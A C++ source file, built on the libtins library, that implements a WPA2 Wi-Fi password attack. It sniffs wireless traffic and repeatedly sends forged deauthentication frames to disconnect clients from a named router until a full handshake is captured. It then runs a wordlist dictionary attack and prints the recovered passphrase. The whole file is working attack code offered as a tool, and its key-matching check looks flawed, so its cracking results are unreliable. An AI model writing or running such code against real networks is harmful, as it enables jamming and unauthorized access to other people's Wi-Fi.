#include <iostream>
#include <string>
#include <chrono>
#include <thread>
#include <fstream>

#include "tins/tins.h"
#include "Buffer/Packet_Buffer.hpp"

using namespace Tins::Crypto;

void jamm_device(int count, Tins::Dot11::address_type destination, Tins::Dot11::address_type router, std::string ssid,
                 Tins::NetworkInterface iface) {

    Tins::RadioTap radio = Tins::RadioTap();
    Tins::Dot11Deauthentication deauth_packet = Tins::Dot11Deauthentication(destination, router);
    deauth_packet.addr3(router);
    deauth_packet.ssid(ssid);
    uint16_t teser = 3;
    deauth_packet.reason_code(teser);

    auto sender = std::make_unique<Tins::PacketSender>();
    //encap deauth_packet in RadioTap!
    radio /= deauth_packet;
    for (int i = 0; i < count; i++) {
        sender->send(radio, iface);
    }

}

int
start_pw_hack(Tins::RSNHandshakeCapturer &rsnhand, Tins::Dot11Data *data_frame, std::string ssid, std::string wordlist,
              std::string &psk) {

    std::string string_test{""};
    Tins::RSNEAPOL eapol = data_frame->rfind_pdu<Tins::RSNEAPOL>();
    if ((eapol.key_ack() == 1) && (eapol.encrypted() == 0)) {

        string_test += " 1. ";
    } else if ((eapol.key_mic() == 1) && (eapol.secure() == 0)) {

        string_test += " 2. ";
    } else if (eapol.encrypted() == 1) {

        string_test += " 3. ";
    } else {

        string_test += " 4. ";

    }
    if (rsnhand.process_packet(*data_frame)) {
        //read line for line = 1 passphrase
        auto future = std::async(std::launch::async, [ssid, &psk, wordlist, rsnhand]() {
                                     bool found = false;
                                     Tins::Crypto::WPA2::SessionKeys session_keys;
                                     std::ifstream input(wordlist);
                                     std::string phrase;
                                     if (!input) {
                                         return 3;
                                     }

                                     while (!(found) && (std::getline(input, phrase))) {
                                         std::cout << phrase << std::endl;
                                         //PMK
                                         Tins::Crypto::WPA2::SupplicantData sup_data(phrase, ssid);
                                         try {
                                             //PTK
                                             session_keys = Tins::Crypto::WPA2::SessionKeys(rsnhand.handshakes().front(), sup_data.pmk());
                                             found = true;
                                             psk = phrase;
                                             return 1;
                                         }

                                         catch (...) {
                                             //Nothing found
                                             //return 3;
                                         }
                                     }
                                     return 4;
                                 }
        );
        return future.get();
    } else {
        //TODO with config!
        //TODO check if bss_subnet is in hacking mode!
        //  _printer->print_string("Need whole handshake! Reforce EAPOL handshake ");
        //auto iface = Tins::NetworkInterface("wlp2s0");
        //_deauth_sender->jamm_device(100, host->get_addresses().hw_addr, router->get_addresses().hw_addr, ssid, iface);
        return 2;
    }
}

std::string analyse_packet(Tins::RSNHandshakeCapturer &rsnhand, Tins::Dot11Data *data_frame, std::string ssid,
                           std::string wordlist) {
    std::string psk{""};
    auto return_value = start_pw_hack(rsnhand, data_frame, ssid, wordlist, psk);
    switch (return_value) {
        case 1: {
            //got psk!
            return psk;
        }
        case 2:
            //need whole handshake!
            return "Go on need whole handshake!";
        case 3:
            //Wrong Wordlist
            return "Error! Wrong wordlist!";
        case 4:
            //something went wrong
            return "Go on need whole handshake!";
    }
    return "";
}

std::string process_packets(std::string iface_send, std::string iface_recv, std::string ssid, std::string wordlist,
                            std::string mac_router) {
    auto packet_buffer = std::make_unique<Packet_buffer>(iface_recv);
    Tins::RSNHandshakeCapturer rsnhand = Tins::RSNHandshakeCapturer();
    packet_buffer->start_sniffing();
    auto start_time = std::chrono::system_clock::now();
    bool stop_loop = false;

    while (!stop_loop) {
        if (packet_buffer->queue_status()) {
            auto packet = packet_buffer->get_packet();

            try {
                auto pdu = packet.pdu();

                auto data_frame = pdu->find_pdu<Tins::Dot11Data>();
                if (data_frame != nullptr) {
                    auto return_value = analyse_packet(rsnhand, data_frame, ssid, wordlist);
                    if (return_value.find("Error! Wrong wordlist!") != std::string::npos) {
                        return "Error! Wrong wordlist!";
                    } else if (return_value.find("Go on need whole handshake!") != std::string::npos) {
                        auto timestamp = std::chrono::system_clock::now();
                        if (start_time + std::chrono::seconds(3) < timestamp) {
                            start_time = timestamp;
                            if (data_frame->addr2().to_string() == mac_router)
                                jamm_device(10, data_frame->addr1(), data_frame->addr2(), ssid, iface_send);
                            else
                                jamm_device(10, data_frame->addr2(), data_frame->addr1(), ssid, iface_send);
                        }
                    } else
                        return "Passphrase is: " + return_value;
                }
            }
            catch (...) {
                //std::cout << "Error during paket interpretation" << std::endl;
            }
        }
    }
    return "";
}

//Need for 2 diff. ifaces one to send one to sniff!

std::string
wpa2PassphraseHack(std::string password_list, std::string network_interface_send, std::string network_interface_recv,
                   std::string mac_router, std::string router_ssid) {
    auto return_string = process_packets(network_interface_send, network_interface_recv, router_ssid, password_list,
                                         mac_router);
    return return_string;
}
